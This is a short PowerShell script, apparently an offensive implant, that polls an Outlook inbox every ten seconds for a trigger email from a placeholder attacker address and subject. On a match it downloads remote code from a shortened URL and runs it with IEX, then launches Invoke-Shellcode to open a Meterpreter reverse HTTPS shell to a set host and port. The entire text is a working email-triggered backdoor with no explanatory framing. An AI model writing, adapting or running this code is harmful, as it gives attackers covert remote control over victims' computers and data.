while($true){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$inbox.items | foreach { 
if($_.SenderEmailAddress -match "ATTACKER@EMAILADDRESS.COM" -and $_.subject -match "CUSTOMSUBJECT")
{$WebClientObject = New-Object Net.WebClient
IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 10.0.0.13 -LPORT 1111 -Force
Return}
  
}
start-sleep -s 10  
}
